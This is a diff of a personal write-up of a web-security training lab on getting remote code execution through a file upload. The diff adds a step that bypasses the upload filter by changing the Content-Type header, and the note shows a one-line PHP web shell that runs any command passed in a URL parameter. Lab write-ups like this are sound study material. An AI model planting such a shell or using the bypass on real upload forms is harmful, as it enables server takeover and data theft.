@@ -7,7 +7,7 @@
 - **Date Solved:** 2026-08-02
 
 ---
-
+Similar to [[Remote code execution via web shell upload]]
 ## 🎯 1. Lab Objective
 >Upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
 
@@ -27,12 +27,15 @@ multipart/form-data : PDF or Image files (large amount of binary data)
 
 1. **Step 1:** Sign in using the given credentials.
 ![[Pasted image 20260802155432.png]]
-2. **Step 2:** Upload a simple PHP file into the Avatar Upload section to gain the system's control
+2. **Step 2:** Upload a simple PHP file into the Avatar Upload section to gain the system's control. Plus, change the Content-Type header to bypass the restricting logic using Repeater
 ```php
 <?php echo system($_GET['command']); ?>
 ```
+![[Pasted image 20260802161808.png]]
+![[Pasted image 20260802161846.png]]
+
 1. **Step 3:** Once gained the control. Change the parameter of 'command' into whatever command we want!
-![[Pasted image 20260802154825.png]]
+![[Pasted image 20260802161948.png]]
 ---
 
 ## ⚡ 4. PoC / Final Payload
